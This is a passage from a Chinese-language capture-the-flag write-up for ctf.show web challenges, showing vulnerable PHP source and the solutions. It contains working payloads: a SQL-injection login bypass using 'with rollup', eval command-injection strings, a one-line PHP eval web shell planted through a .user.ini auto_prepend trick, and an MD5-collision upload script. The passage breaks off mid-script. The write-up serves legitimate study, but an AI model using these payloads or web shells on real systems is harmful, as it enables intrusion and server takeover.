"/(select|from|where|join|sleep|and|\s|union|,)/i";</code>从源码中可以得知几乎把注入用到的关键词过滤的差不多了。如果只有这一条现在可以采用双写绕过，但是下面这条限制，使得无法<strong>双写</strong>绕过</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>点击<strong>取消</strong>按钮、获得php文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function-definition function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span></code></pre><p><strong>解析</strong>：</p><p>这段代码是一个简单的PHP登录验证示例，其原理是检查用户输入的用户名和密码是否存在于数据库中，并防止SQL注入攻击。</p><ol type="1"><li><p>首先，<code>replaceSpecialChar()</code>函数用于替换输入字符串中的特殊字符，例如<code>select</code>、<code>from</code>、<code>where</code>、<code>join</code>、<code>sleep</code>、<code>and</code>、空白字符、<code>union</code>和逗号等。它使用正则表达式将这些特殊字符替换为空字符串。</p></li><li><p>接下来，代码检查数据库连接是否成功。如果连接失败，代码将终止执行并显示错误消息。</p></li><li><p>然后，代码检查用户名和密码的长度是否与替换特殊字符后的长度相同。如果不相同，说明输入的用户名或密码中包含了特殊字符，可能是SQL注入攻击的尝试。在这种情况下，代码会终止执行并显示错误消息。</p></li><li><p>如果用户名和密码通过长度检查，代码会构造一个SQL查询语句，使用输入的用户名作为查询条件，从数据库中检索用户记录。</p></li><li><p>执行查询并检查结果集中是否有记录。如果有记录，说明用户名存在于数据库中。然后，代码会遍历结果集，检查输入的密码是否与数据库中的密码匹配。如果匹配成功，代码将显示"登录成功"的消息，并显示一个名为<code>$flag</code>的变量的值。</p></li></ol><p>总体上，该代码的目的是验证用户的登录凭据，并使用一些简单的防御措施来防止SQL注入攻击。然而，该代码并没有涵盖所有的安全性考虑，建议在实际应用中使用更加健壮和安全的验证机制来保护用户数据和系统安全。</p></li><li><p>payload:<code>username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></p><p>用户名输入：<code>admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#</code>（<strong>#</strong>不能丢）</p><p>使用<code>with rollup</code> 使得查询结果出现<code>NULL</code>列<imgsrc="https://s2.loli.net/2023/05/19/SmdG4YXtErf57gs.jpg"alt="web10_4" />使用这个用户名，查询出对应的密码为空，因此提交密码为空，即可使得用户名和密码匹配</p></li></ol><h4 id="web11-代码审计">Web11： 代码审计</h4><ul><li><p><strong>keywords</strong></p><p>session</p></li><li><p>注意到</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><code>session</code>的password存储在本地，删除<imgsrc="https://s2.loli.net/2023/05/19/FTxWSucVpiJDvKt.png"alt="s" /></p></li></ul><h4 id="web12-注释">Web12: 注释</h4><ul><li><p>keywords</p><p>注释</p><p><code>global()</code></p><p><code>print_r()</code></p></li></ul><ol type="1"><li>注意<strong>;</strong></li></ol><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">phpinfo()</span></span><span class="token pair-delimiter">;</span></span></code></pre><figure><img src="https://s2.loli.net/2023/05/19/fX25xBDgZwouazj.png"alt="image-20230519015308143" /><figcaption aria-hidden="true">image-20230519015308143</figcaption></figure><ol start="2" type="1"><li><p>paylod</p><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">highlight_file(</span></span></span>"index.php");</code></pre><figure><img src="https://s2.loli.net/2023/05/19/oPVgn24tRuJ1Oh6.png"alt="image-20230519015828824" /><figcaption aria-hidden="true">image-20230519015828824</figcaption></figure><p><code>Global</code>函数</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">)</span> 匹配任意文件<span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*.txt"</span><span class="token punctuation">)</span>匹配以txt为后缀的文件</code></pre><p><strong>payload</strong></p><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">print_r(glob(</span></span></span>"*"));</code></pre><figure><img src="https://s2.loli.net/2023/05/19/F5ksnci37muDTGK.png"alt="image-20230519020418592" /><figcaption aria-hidden="true">image-20230519020418592</figcaption></figure></li><li><p>payload</p><pre class="language-uri" data-language="uri"><code class="language-uri"><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">cmd</span>=<span class="token value">highlight_file(</span></span></span>"903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php");</code></pre><figure><img src="https://s2.loli.net/2023/05/19/1F96CpngIavtkZi.png"alt="image-20230519020207932" /><figcaption aria-hidden="true">image-20230519020207932</figcaption></figure></li></ol><h4 id="红包题第2弹-代码审计">红包题第2弹： 代码审计</h4><ul><li><p><strong>keywords</strong></p><p>get</p><p>临时文件</p><p>正则匹配</p><p>post请求体</p><p>文件上传：<code>Content-Type: multipart/form-data</code></p></li></ul><ol type="1"><li><p>F12,看懂注释，<code>Cmd</code><imgsrc="https://s2.loli.net/2023/05/20/jqY8y9iVuRPoKH5.png"alt="image-20230520211852091" /></p></li><li><p>关键点是两个正则表达式，分别为<code>preg_match("/[A-Za-oq-z0-9$]+/",$cmd)</code>和</p><ol type="1"><li><code>preg_match("/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\'|\"|\:|\,/",$cmd)</code>，这两个正则将除了p字母以外的所有字母数字和一些特殊符号进行了过滤。</li><li>在php中，使用<code>Content-Type: multipart/form-data;</code>上传文件时，会将它保存在临时文件中，在php的配置中<code>upload_tmp_dir</code>参数为保存临时文件的路经，linux下面默认为<code>/tmp</code>。也就是说只要php接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且php每次创建的临时文件名都有固定的格式，为<code>phpXXXX.tmp</code>（Windows中）、<code>php**.tmp</code>（Linux中）</li><li><code>&lt;?=</code>等价于<code>&lt;?php echo</code></li><li><strong>通配符</strong>是用于匹配文件名、路径名或其他字符串的特殊字符或字符序列。在Linux 和类 Unix操作系统中，常见的通配符包括星号（<code>*</code>）、问号（<code>?</code>）、方括号（<code>[]</code>）和花括号（<code>&#123;&#125;</code>）。<ul><li>星号（<code>*</code>）：匹配任意字符序列（包括空字符序列）。</li><li>问号（<code>?</code>）：匹配单个字符。</li><li>方括号（<code>[]</code>）：用于指定字符范围，匹配方括号中的任意一个字符。</li><li>花括号（<code>&#123;&#125;</code>）：用于指定多个选择项，匹配花括号中的任意一个选择</li></ul></li></ol></li><li><p>Code</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-oq-z0-9$]+/"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cerror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\'|\"|\:|\,/"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"serror"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></span></code></pre><ul><li><p><code>eval()</code> 是一个 PHP 函数，用于执行传递给它的字符串作为PHP 代码。它将字符串解析为可执行的 PHP代码，并在当前的执行环境中执行它。</p><p>在给定的代码字符串 <code>$cmd</code> 中，<code>eval($cmd)</code>的作用是执行 <code>$cmd</code> 所包含的 PHP代码。这样可以动态地执行用户输入的命令或代码，并得到相应的结果</p></li></ul></li><li><p>请求体<imgsrc="https://s2.loli.net/2023/05/20/rVqjS2xbMGLtAm8.png"alt="image-20230520225450040" /><strong>响应体</strong><imgsrc="https://s2.loli.net/2023/05/20/FWyGIVoTMg8ihEL.png"alt="image-20230520225711139" />再次使用<code>cat /flag.txt</code></p></li></ol><h4 id="web13-一句话木马">Web13 : 一句话木马</h4><ul><li><p><strong>keywords</strong></p><p>一句话木马</p><p>.usr.ini</p></li></ul><ol type="1"><li><p>源码泄露</p><p>upload.php.bak<strong>|</strong>.hg<strong>|</strong>.git<strong>|</strong> .DS_Store文件泄漏<strong>|</strong>.phps.bak结尾的网页</p><pre class="language-python" data-language="python"><code class="language-python">https<span class="token punctuation">:</span><span class="token operator">//</span>3d2fad8a<span class="token operator">-</span>33c2<span class="token operator">-</span><span class="token number">4372</span><span class="token operator">-</span>9d18<span class="token operator">-</span>4b277330cc2a<span class="token punctuation">.</span>challenge<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>show<span class="token operator">/</span>upload<span class="token punctuation">.</span>php<span class="token punctuation">.</span>bak</code></pre><p>下载源文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$temp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$error</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ext_suffix</span> <span class="token operator">=</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span> <span class="token operator">></span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file zise"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ext_suffix</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php/i"</span><span class="token punctuation">,</span><span class="token variable">$ext_suffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error suffix"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php/i"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error file name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./'</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传失败！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span></code></pre><p><strong>解析：</strong></p><p>我们发现了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。我们肯定是要上传一句话木马的，既然小于等于24可以这样写<code>&lt;?php eval($_POST['a']);</code>正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句</p></li><li><p><strong>策略</strong></p><ol type="1"><li><p>我们先将一句话保存为a.txt。</p></li><li><p>上传a.txt</p></li><li><p>上传.usr.ini文件</p><p>对于php中的.usr.ini有如下解释： PHP会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。我们在.usr.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容。</p></li><li><p>payload</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 1.  我失败</span>upload<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>a<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2.</span></code></pre></li></ol></li></ol><h4 id="web14sql注入">Web14：sql注入</h4><ul><li><p><strong>keywords</strong>:</p><p>源码</p><p>sql注入</p></li></ul><ol type="1"><li><code>c=3;</code></li><li>获得 <strong>here_1s_your_f1ag.php</strong><imgsrc="https://s2.loli.net/2023/05/21/zhVDQJZpYlCd8ts.png"alt="image-20230521005159295" /></li><li>sql注入</li></ol><h4 id="红包第六弹md5碰撞">红包第六弹：MD5碰撞</h4><ul><li><p><strong>keywords</strong></p><p>Js</p><p>MD5碰撞</p><p>fastcoll_v1.0.0.5 工具</p><p>Python文件上传</p></li></ul><ol type="1"><li><p>F12,Js<imgsrc="https://s2.loli.net/2023/05/21/9ZYXRb3OenHPoDp.png"alt="image-20230521033835753" /></p></li><li><p>dirsearch</p><ol type="1"><li><p>得到 <code>web.zip</code></p></li><li><p>解压得到<strong>check.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">receiveStreamFile</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$streamData</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_RAW_POST_DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_RAW_POST_DATA'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$streamData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$streamData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$streamData</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">,</span> <span class="token variable">$streamData</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$receiveFile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.dat'</span><span class="token punctuation">;</span><span class="token function">receiveStreamFile</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"key.dat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha512"</span><span class="token punctuation">,</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha512"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"key.dat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"人脸识别成功!<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"same file"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"md5 error"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"token error"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>解析：</strong></p><p>发现这里是和key.dat文件进行强碰撞（内容不一样，但是两个文件的md5值相同，同时sha1值不相同）key.dat文件key直接进行下载借助工具：fastcoll_v1.0.0.5.exe生成两个md5值相同的文件。fastcoll_v1.0.0.5.exe-p key.dat -o 1.dat 2.dat</p></li><li><p>python上传两个文件</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">pass</span>mi<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_min<span class="token punctuation">)</span>m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mi<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">'http://ce61acc9-c947-4ac4-9d2c-3b81b8708df5.challenge.ctf.show:8080/check.php?token=&#123;&#125;&amp;php://input'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token 